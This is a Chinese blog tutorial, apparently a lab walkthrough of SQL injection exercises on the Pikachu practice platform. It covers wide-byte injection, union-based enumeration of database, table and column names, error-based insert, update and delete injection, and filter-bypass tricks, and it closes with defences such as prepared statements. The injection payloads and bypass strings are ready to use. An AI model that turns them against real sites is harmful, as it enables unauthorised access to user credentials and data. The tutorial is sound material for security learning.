+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ab2e5750c1349ec13d3c427bc77d4319f4449a45040b151b465721d1ef73b5ed/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838313037342d65396336366263642d666265612d343637332d626436392d3361353438333164646539382e706e67"><img src="https://camo.githubusercontent.com/ab2e5750c1349ec13d3c427bc77d4319f4449a45040b151b465721d1ef73b5ed/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838313037342d65396336366263642d666265612d343637332d626436392d3361353438333164646539382e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498881074-e9c66bcd-fbea-4673-bd69-3a54831dde98.png" style="max-width: 100%;"></a></p>
+<p>'编码</p>
+<p>\编码为%5C,我们一般在地址后添加%df。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0c99f96660f003558384885d078d039d81f479c827f89d77a96a26f60f80a9c4/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838313238392d64366533336637392d613661372d343230652d383532362d3861303435613965303565652e706e67"><img src="https://camo.githubusercontent.com/0c99f96660f003558384885d078d039d81f479c827f89d77a96a26f60f80a9c4/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838313238392d64366533336637392d613661372d343230652d383532362d3861303435613965303565652e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498881289-d6e33f79-a6a7-420e-8526-8a045a9e05ee.png" style="max-width: 100%;"></a></p>
+<p>绕过&lt;/font&gt;</p>
+<p>添加后\变成了汉字，这样就绕过了。之后就和前面的一样了，当然，还有双引号等，除了GBK还有GB2312等编码，有兴趣的可以整理一下所有的。</p>
+<p>为了方便理解，修改一下源代码，打印一下sql语句 。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/573f455e1244cfde5e880bb115c788e4791a88b4841c550cb854d6227ffe618c/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838313530322d65613733353035352d336461612d343830382d613934622d3838396566666334613761362e706e67"><img src="https://camo.githubusercontent.com/573f455e1244cfde5e880bb115c788e4791a88b4841c550cb854d6227ffe618c/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838313530322d65613733353035352d336461612d343830382d613934622d3838396566666334613761362e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498881502-ea735055-3daa-4808-a94b-889effc4a7a6.png" style="max-width: 100%;"></a></p>
+<p>修改源代码</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d263fe0309bd04deda40152e1624c33c3acc9076aa8f92e3575f955a1fd49ff6/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838313831372d35646164316632382d633963652d343135302d386166332d6362643830646530373061632e706e67"><img src="https://camo.githubusercontent.com/d263fe0309bd04deda40152e1624c33c3acc9076aa8f92e3575f955a1fd49ff6/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838313831372d35646164316632382d633963652d343135302d386166332d6362643830646530373061632e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498881817-5dad1f28-c9ce-4150-8af3-cbd80de070ac.png" style="max-width: 100%;"></a></p>
+<p>vince' and 1=1#</p>
+<p>后端及数据库设置字符集为GBK，或其他低位为%5C的字符集。</p>
+<p>%df%5C%27 or 1=1#</p>
+<p><strong>Pikachu其他题目</strong></p>
+<p>火狐浏览器及插件hackbar v2。</p>
+<h3>数字型注入(post)</h3>
+<p>参数为数字，一般是id等。</p>
+<p>1、没有输入框，所以抓包修改</p>
+<p>判断是否有注入：id=2 and 1=1页面返回正常</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ba04f6819d39c04e0daaf56fa8911241098736597043c5c99f627d5a58b8f9e5/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323031382d39376362646136352d643764342d343964392d626234352d6261643132633064306539342e706e67"><img src="https://camo.githubusercontent.com/ba04f6819d39c04e0daaf56fa8911241098736597043c5c99f627d5a58b8f9e5/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323031382d39376362646136352d643764342d343964392d626234352d6261643132633064306539342e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882018-97cbda65-d7d4-49d9-bb45-bad12c0d0e94.png" style="max-width: 100%;"></a></p>
+<p>id=2 and 1=2 页面报错，存在注入  1不等于2为false</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9b934e0d8c5efeeeec0c29bdcc90dca37856faec6838f1e20b143973fddc4014/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323232372d65663930323737362d356431362d343436662d386261622d3264356535663430343732332e706e67"><img src="https://camo.githubusercontent.com/9b934e0d8c5efeeeec0c29bdcc90dca37856faec6838f1e20b143973fddc4014/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323232372d65663930323737362d356431362d343436662d386261622d3264356535663430343732332e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882227-ef902776-5d16-446f-8bab-2d5e5f404723.png" style="max-width: 100%;"></a></p>
+<p>2、根据返回内容，可判断可能有两个注入点，通过order by语句判断是否正确</p>
+<p>id=2 order by 2没有报错</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/13df88270a2b038c99183f486a6fcea3a11c19ecc3c8a781e119b1873a3f998c/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323533342d36666261613639392d633131332d343535622d613632652d3163306261376663636230632e706e67"><img src="https://camo.githubusercontent.com/13df88270a2b038c99183f486a6fcea3a11c19ecc3c8a781e119b1873a3f998c/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323533342d36666261613639392d633131332d343535622d613632652d3163306261376663636230632e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882534-6fbaa699-c113-455b-a62e-1c0ba7fccb0c.png" style="max-width: 100%;"></a></p>
+<p>id=2 order by 3</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/44c404b138a3366abc967b5a4e3f8f92a2cc5692c92ea467d7c6060abe88c3b9/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323734302d32353530633437662d653933622d346636642d613434332d3532376231353063316331372e706e67"><img src="https://camo.githubusercontent.com/44c404b138a3366abc967b5a4e3f8f92a2cc5692c92ea467d7c6060abe88c3b9/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323734302d32353530633437662d653933622d346636642d613434332d3532376231353063316331372e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882740-2550c47f-e93b-4f6d-a443-527b150c1c17.png" style="max-width: 100%;"></a></p>
+<p>3、尝试union联合来确定注入点</p>
+<p>id=2 union select 99,98</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4526445a80d60daf252e9a6005591e2e6d1e07f9e0e90a807bac973c3d892cda/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323936322d32626263643663392d316539652d343439622d396339362d6333623934373866643265622e706e67"><img src="https://camo.githubusercontent.com/4526445a80d60daf252e9a6005591e2e6d1e07f9e0e90a807bac973c3d892cda/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838323936322d32626263643663392d316539652d343439622d396339362d6333623934373866643265622e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882962-2bbcd6c9-1e9e-449b-9c96-c3b9478fd2eb.png" style="max-width: 100%;"></a></p>
+<p>4、开始爆数据库</p>
+<p>id=2 union select 99,database()</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/01f6cc3d83b612c6404ccecef974962e0c6f7c3ec3e9d0b1882f20c14a819fd7/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838333137322d34306632313466382d383134662d343939322d613862392d3762613439366663356563642e706e67"><img src="https://camo.githubusercontent.com/01f6cc3d83b612c6404ccecef974962e0c6f7c3ec3e9d0b1882f20c14a819fd7/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838333137322d34306632313466382d383134662d343939322d613862392d3762613439366663356563642e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498883172-40f214f8-814f-4992-a8b9-7ba496fc5ecd.png" style="max-width: 100%;"></a></p>
+<p>数据库名称：pikachu</p>
+<p>5、根据pikachu，爆表名，union联合查询需要借助information_schema数据库，来查询当前数据库信息，information_schema是mysql自带的数据库</p>
+<p>id=2 union select 99,table_name from information_schema.tables where table_schema = 'pikachu'</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/90d968e5b6625189efe2ef027d53d8af8f3a57d9d836ab72654e8fb6cd2c9225/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838333336302d62653637643739352d363462662d346436342d626233652d3835343430323830356536642e706e67"><img src="https://camo.githubusercontent.com/90d968e5b6625189efe2ef027d53d8af8f3a57d9d836ab72654e8fb6cd2c9225/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838333336302d62653637643739352d363462662d346436342d626233652d3835343430323830356536642e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498883360-be67d795-64bf-4d64-bb3e-854402805e6d.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/44c04d89a62d9aa5258136565d4bba7fb46b49bf1ec736bed7bda9d73d7242fe/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838333635382d63646635653232332d356132302d343062352d393234322d6235386137306365613034622e706e67"><img src="https://camo.githubusercontent.com/44c04d89a62d9aa5258136565d4bba7fb46b49bf1ec736bed7bda9d73d7242fe/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838333635382d63646635653232332d356132302d343062352d393234322d6235386137306365613034622e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498883658-cdf5e223-5a20-40b5-9242-b58a70cea04b.png" style="max-width: 100%;"></a></p>
+<p>可以看到存在一个users表，猜测用户、密码放在里面</p>
+<p>6、根据users表，爆列名</p>
+<p>union select 99,column_name from information_schema.columns where table_name='users'</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/018bc161acb52422597cb88923fbcd63085585df51bed7e9272a84a311322796/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838333838332d62383238326534652d343062392d346163332d616437622d6433363636343739333063312e706e67"><img src="https://camo.githubusercontent.com/018bc161acb52422597cb88923fbcd63085585df51bed7e9272a84a311322796/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838333838332d62383238326534652d343062392d346163332d616437622d6433363636343739333063312e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498883883-b8282e4e-40b9-4ac3-ad7b-d366647930c1.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4df7d551a61ab7b5a6f4382a7caaa66eb3cdf074f96c9857bc9b737e409c9600/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838343131302d38373736613734612d386636382d343066312d616363362d6639613965303933623636342e706e67"><img src="https://camo.githubusercontent.com/4df7d551a61ab7b5a6f4382a7caaa66eb3cdf074f96c9857bc9b737e409c9600/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838343131302d38373736613734612d386636382d343066312d616363362d6639613965303933623636342e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498884110-8776a74a-8f68-40f1-acc6-f9a9e093b664.png" style="max-width: 100%;"></a></p>
+<p>可以看出存在user、password列</p>
+<p>7、最后一步，根据表，爆数据</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ca800478bb64228c0cb2981d2905cb969aaed1801c43d734b0e015e939e7d5cd/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838343236382d62633662623539382d653464382d343530342d393865362d3161613365333833636361632e706e67"><img src="https://camo.githubusercontent.com/ca800478bb64228c0cb2981d2905cb969aaed1801c43d734b0e015e939e7d5cd/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838343236382d62633662623539382d653464382d343530342d393865362d3161613365333833636361632e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498884268-bc6bb598-e4d8-4504-98e6-1aa3e383ccac.png" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bffa8de2b8a171735f2677e5e3437597b23c7b590fe084fdb49e4ac10fec0e36/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838343436362d32626662353565332d653532312d346235622d626439362d3534323032383831366132652e706e67"><img src="https://camo.githubusercontent.com/bffa8de2b8a171735f2677e5e3437597b23c7b590fe084fdb49e4ac10fec0e36/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838343436362d32626662353565332d653532312d346235622d626439362d3534323032383831366132652e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498884466-2bfb55e3-e521-4b5b-bd96-542028816a2e.png" style="max-width: 100%;"></a></p>
+<p>密码是md5加密，通过在线解密就可以</p>
+<p>0x3a是冒号的ASCII码</p>
+<p>一次手工注入的基本过程如上所述，接下来大部分只讲原理，有特殊的地方再提示。</p>
+<h3>字符型注入</h3>
+<p>将参数以字符或字符串形式读入，通过闭合+注释的方式来进行SQL注入，一般是'或"，或者结合()。</p>
+<h4>判断闭合</h4>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8bdc31398a340073726eb4d5dee00d206d18b961c483abaef901561aaa671498/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838343731382d37623565613766372d306630322d346662612d613266392d3266353839393133333933372e706e67"><img src="https://camo.githubusercontent.com/8bdc31398a340073726eb4d5dee00d206d18b961c483abaef901561aaa671498/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838343731382d37623565613766372d306630322d346662612d613266392d3266353839393133333933372e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498884718-7b5ea7f7-0f02-4fba-a2f9-2f5899133937.png" style="max-width: 100%;"></a></p>
+<p>标题</p>
+<h4>获取数据</h4>
+<p><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=d" rel="nofollow">http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=d</a>'union select 1,database()--+&amp;submit=%E6%9F%A5%E8%AF%A2</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3696f5e1147ab6c7c027008fe7c053014f71a0d32fbf8e7080b910a3297313cc/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353031342d64386261363033632d666366332d346438362d613733362d3734653037626634323565632e706e67"><img src="https://camo.githubusercontent.com/3696f5e1147ab6c7c027008fe7c053014f71a0d32fbf8e7080b910a3297313cc/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353031342d64386261363033632d666366332d346438362d613733362d3734653037626634323565632e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885014-d8ba603c-fcf3-4d86-a736-74e07bf425ec.png" style="max-width: 100%;"></a></p>
+<p>获取数据库名</p>
+<h3>搜索型注入</h3>
+<p>其实也算是字符型注入</p>
+<p>搜索一般sql语句如下，</p>
+<p>select * from users where username like '%$name'</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/513a6138727ff1456387bfbd31eb951d936c620a2dc1d9887a7546df12f84749/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353332322d62663965306239302d373264622d346536372d616362392d6263386238393134643934362e706e67"><img src="https://camo.githubusercontent.com/513a6138727ff1456387bfbd31eb951d936c620a2dc1d9887a7546df12f84749/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353332322d62663965306239302d373264622d346536372d616362392d6263386238393134643934362e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885322-bf9e0b90-72db-4e67-acb9-bc8b8914d946.png" style="max-width: 100%;"></a></p>
+<p>测试闭合字符</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/505033ad9b80aad726f4734c56f9f9844757465b63f8447ae444662840cd899b/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353536372d38333665613530612d383965652d343730632d393738392d6562326661643861646136362e706e67"><img src="https://camo.githubusercontent.com/505033ad9b80aad726f4734c56f9f9844757465b63f8447ae444662840cd899b/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353536372d38333665613530612d383965652d343730632d393738392d6562326661643861646136362e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885567-836ea50a-89ee-470c-9789-eb2fad8ada66.png" style="max-width: 100%;"></a></p>
+<p>使用'or 1=1，条件判断为TRUE，所有的都返回，想获取其他的你就从前面常用语句去粘贴就行了。</p>
+<h3>xx型注入</h3>
+<p>其实还是字符型，只不过需要两个字符去闭合，就是前面提到的()，sql语句类型下面这种,和前面的差不多。</p>
+<p>select * from users where username = ('$name')</p>
+<p><strong>注入判断</strong></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d2d9f4bf12e51505294674239cf59e1e06b30e1ad8eb9a92fcbb786dbc75d37b/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353830392d31396432613934332d663731312d343462362d386133312d6536663238636362333937352e706e67"><img src="https://camo.githubusercontent.com/d2d9f4bf12e51505294674239cf59e1e06b30e1ad8eb9a92fcbb786dbc75d37b/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353830392d31396432613934332d663731312d343462362d386133312d6536663238636362333937352e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885809-19d2a943-f711-44b6-8a31-e6f28ccb3975.png" style="max-width: 100%;"></a></p>
+<p>** "insert/update"注入**</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/308090b7afd9f878e4e13de45717283cc336fbfef8b2bf5691c63e61d2d66214/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353939332d31303566336233642d623739652d346132392d383237372d3761323836336362633331352e706e67"><img src="https://camo.githubusercontent.com/308090b7afd9f878e4e13de45717283cc336fbfef8b2bf5691c63e61d2d66214/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838353939332d31303566336233642d623739652d346132392d383237372d3761323836336362633331352e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885993-105f3b3d-b79e-4a29-8277-7a2863cbc315.png" style="max-width: 100%;"></a></p>
+<p>0x7e是~，结果如下：</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/de6aa7783036e96ef89caafa4857277cae9f29e18645ec14bd4242ab349ea021/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838363137302d34386436306438622d393534322d343238642d393138322d6165363461343939666237372e706e67"><img src="https://camo.githubusercontent.com/de6aa7783036e96ef89caafa4857277cae9f29e18645ec14bd4242ab349ea021/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838363137302d34386436306438622d393534322d343238642d393138322d6165363461343939666237372e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498886170-48d60d8b-9542-428d-9182-ae64a499fb77.png" style="max-width: 100%;"></a></p>
+<p>数据库</p>
+<p><strong>"delete注入"</strong></p>
+<p>和上面的差不多,id那里可以报错注入，可以使用Burpsuite进行抓包。</p>
+<p>宽字节注入</p>
+<h3>sql注入绕过</h3>
+<h4>大小写绕过</h4>
+<p>sql语句对一些关键词不区分大小写，如果网站代码没有进行大小写检查可以使用</p>
+<p>UniOn select * from user</p>
+<h4>双写绕过</h4>
+<p>网站代码找到关键词后删除，可以通过双写构造删除后符合语法的sql语句</p>
+<p>selselectect * from user</p>
+<h4>内联注释</h4>
+<p>mysql扩展功能，在/*后加惊叹号，注释中的语句会被执行</p>
+<p>and /<em>!select * from user</em>/</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0e129dc4dc3c41b1bc8126a774038eec10a34e2779f279aabb1d66eac62e9337/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838363333352d31356636626239312d333539652d346135362d396233652d3039613238336334306266372e706e67"><img src="https://camo.githubusercontent.com/0e129dc4dc3c41b1bc8126a774038eec10a34e2779f279aabb1d66eac62e9337/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838363333352d31356636626239312d333539652d346135362d396233652d3039613238336334306266372e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498886335-15f6bb91-359e-4a56-9b3e-09a283c40bf7.png" style="max-width: 100%;"></a></p>
+<h4>注释符绕过</h4>
+<p>注释符不影响语句的连接，</p>
+<p>sel/**/ect * from user</p>
+<h4>or/and绕过</h4>
+<p>使用逻辑符号代替：and = &amp;&amp;, or = ||</p>
+<p>select * from emp where sal &gt; 500 &amp;&amp; sal &lt; 3000;</p>
+<h4>空格绕过</h4>
+<p>有的网站过滤了空格，可以尝试使用</p>
+<p>%0a、%b、%0c、%0d、%09、%a0</p>
+<p>或者</p>
+<p>/**/、()</p>
+<p>例如</p>
+<p> select * from/**/emp where (sal) &gt; 500 &amp;&amp; sal &lt; 3000;</p>
+<p>等价于</p>
+<p>select * from emp where sal &gt; 500 and sal &lt; 3000;</p>
+<h3>防御SQL注入的方法</h3>
+<h4>使用预编译语句</h4>
+<p>绑定变量，攻击者无法改变SQL的结构。不同的编程语言Java、Php有不同的语法，就不做展示了。在<a href="https://blog.csdn.net/lady_killer9/article/details/108978062" rel="nofollow">网络安全-php安全知识点</a>中提到了使用pdo来防御。</p>
+<h4>使用存储过程</h4>
+<p>使用安全的存储过程对抗SQL注入，由于存储过程中也可能存在SQL注入问题，应尽量避免使用动态SQL语句。</p>
+<h4>检查数据类型</h4>
+<p>例如，需要输入的是整型，那么，可以判断用户的输入，如果包含非整型，例如，字符串"AND"、“BENCHMARK”等，则不运行sql语句。其他类型，例如，邮箱等可以通过使用正则表达式来进行判断。</p>
+<h4>上web安全防火墙</h4></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://yixunblog.github.io">亦寻个人博客</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
